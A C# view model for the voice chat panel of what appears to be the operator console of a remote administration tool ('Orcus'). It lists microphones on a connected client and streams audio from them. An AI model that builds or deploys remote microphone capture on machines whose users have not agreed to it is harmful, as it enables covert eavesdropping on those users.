using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using CSCore.CoreAudioAPI;
using CSCore.Streams;
using OpusWrapper.Native;
using Orcus.Administration.Commands.VoiceChat;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.CommandViewModels.VoiceChat;
using Orcus.Shared.Commands.VoiceChat;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(16)]
    public class VoiceChatViewModel : CommandView
    {
        private Application _application;
        private int _bitrate;
        private bool _isLocalStreaming;
        private bool _isRemoteStreaming;
        private List<LocalCaptureDeviceInfo> _localCaptureDevices;
        private AudioVisualizationDataProvider _localVisualisationDataProvider;
        private List<CaptureDeviceInfo> _remoteCaptureDevices;
        private AudioVisualizationDataProvider _remoteVisualisationDataProvider;
        private LocalCaptureDeviceInfo _selectedLocalCaptureDevice;
        private CaptureDeviceInfo _selectedRemoteCaptureDevice;
        private VoiceChatCommand _voiceChatCommand;

        public override string Name { get; } = (string) System.Windows.Application.Current.Resources["VoiceChat"];
        public override Category Category { get; } = Category.Utilities;

        public List<CaptureDeviceInfo> RemoteCaptureDevices
        {
            get { return _remoteCaptureDevices; }
            set { SetProperty(value, ref _remoteCaptureDevices); }
        }

        public List<LocalCaptureDeviceInfo> LocalCaptureDevices
        {
            get { return _localCaptureDevices; }
            set { SetProperty(value, ref _localCaptureDevices); }
        }

        public LocalCaptureDeviceInfo SelectedLocalCaptureDevice
        {
            get { return _selectedLocalCaptureDevice; }
            set { SetProperty(value, ref _selectedLocalCaptureDevice); }
        }

        public CaptureDeviceInfo SelectedRemoteCaptureDevice
        {
            get { return _selectedRemoteCaptureDevice; }
            set { SetProperty(value, ref _selectedRemoteCaptureDevice); }
        }

        public int Bitrate
        {
            get { return _bitrate; }
            set
            {
                if (SetProperty(value, ref _bitrate))
                    _voiceChatCommand.Bitrate = value;
            }
        }

        public Application Application
        {
            get { return _application; }
            set
            {
                if (SetProperty(value, ref _application))
                    _voiceChatCommand.Application = _application;
            }
        }

        public bool IsLocalStreaming
        {
            get { return _isLocalStreaming; }
            set
            {
                if (SetProperty(value, ref _isLocalStreaming))
                    if (value)
                    {
                        if (SelectedLocalCaptureDevice != null)
                            _voiceChatCommand.StartLocalStreaming(SelectedLocalCaptureDevice.Device);
                    }
                    else
                        _voiceChatCommand.StopLocalStreaming();
            }
        }

        public bool IsRemoteStreaming
        {
            get { return _isRemoteStreaming; }
            set
            {
                if (SetProperty(value, ref _isRemoteStreaming))
                    if (value)
                    {
                        if (SelectedRemoteCaptureDevice != null)
                            _voiceChatCommand.StartRemoteStreaming(SelectedRemoteCaptureDevice);
                    }
                    else
                        _voiceChatCommand.StopRemoteStreaming();
            }
        }

        public AudioVisualizationDataProvider LocalVisualisationDataProvider
        {
            get { return _localVisualisationDataProvider; }
            set { SetProperty(value, ref _localVisualisationDataProvider); }
        }

        public AudioVisualizationDataProvider RemoteVisualisationDataProvider
        {
            get { return _remoteVisualisationDataProvider; }
            set { SetProperty(value, ref _remoteVisualisationDataProvider); }
        }

        public override void Dispose()
        {
            base.Dispose();

            if (_localCaptureDevices != null)
                foreach (var localCaptureDeviceInfo in _localCaptureDevices)
                    localCaptureDeviceInfo.Device.Dispose();
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _voiceChatCommand = clientController.Commander.GetCommand<VoiceChatCommand>();
            _voiceChatCommand.CaptureDevicesReceived += VoiceChatCommandOnCaptureDevicesReceived;
            _voiceChatCommand.LocalBlockRead += VoiceChatCommandOnLocalBlockRead;
            _voiceChatCommand.RemoteBlockRead += VoiceChatCommandOnRemoteBlockRead;
        }

        public override void LoadView(bool loadData)
        {
            base.LoadView(loadData);
            _voiceChatCommand.GetCaptureDevices();

            LocalVisualisationDataProvider = new AudioVisualizationDataProvider();
            RemoteVisualisationDataProvider = new AudioVisualizationDataProvider();
            Application = Application.Voip;
            Bitrate = 8192;
        }

        protected override ImageSource GetIconImageSource()
        {
            return
                new BitmapImage(
                    new Uri("pack://application:,,,/Resources/Images/VisualStudio/CallerOrCalleeView_16x.png",
                        UriKind.Absolute));
        }

        private void VoiceChatCommandOnRemoteBlockRead(object sender, SingleBlockReadEventArgs singleBlockReadEventArgs)
        {
            RemoteVisualisationDataProvider.AddSamples(singleBlockReadEventArgs.Left, singleBlockReadEventArgs.Right);
        }

        private void VoiceChatCommandOnLocalBlockRead(object sender, SingleBlockReadEventArgs singleBlockReadEventArgs)
        {
            LocalVisualisationDataProvider.AddSamples(singleBlockReadEventArgs.Left, singleBlockReadEventArgs.Right);
        }

        private void VoiceChatCommandOnCaptureDevicesReceived(object sender, EventArgs eventArgs)
        {
            RemoteCaptureDevices = _voiceChatCommand.RemoteCaptureDevices;

            using (var mmDeviceEnumerator = new MMDeviceEnumerator())
            using (var devices = mmDeviceEnumerator.EnumAudioEndpoints(DataFlow.Capture, DeviceState.Active))
            using (var defaultDevice = mmDeviceEnumerator.GetDefaultAudioEndpoint(DataFlow.Capture,
                Role.Communications))
            {
                LocalCaptureDevices =
                    devices.Select(
                        x =>
                            new LocalCaptureDeviceInfo
                            {
                                Device = x,
                                Id = x.DeviceID,
                                Name = x.FriendlyName,
                                IsDefault = x.DeviceID == defaultDevice.DeviceID
                            }).ToList();
            }

            SelectedLocalCaptureDevice = LocalCaptureDevices.FirstOrDefault(x => x.IsDefault) ??
                                         LocalCaptureDevices.FirstOrDefault();
            SelectedRemoteCaptureDevice = RemoteCaptureDevices.FirstOrDefault(x => x.IsDefault) ??
                                          RemoteCaptureDevices.FirstOrDefault();
        }
    }
}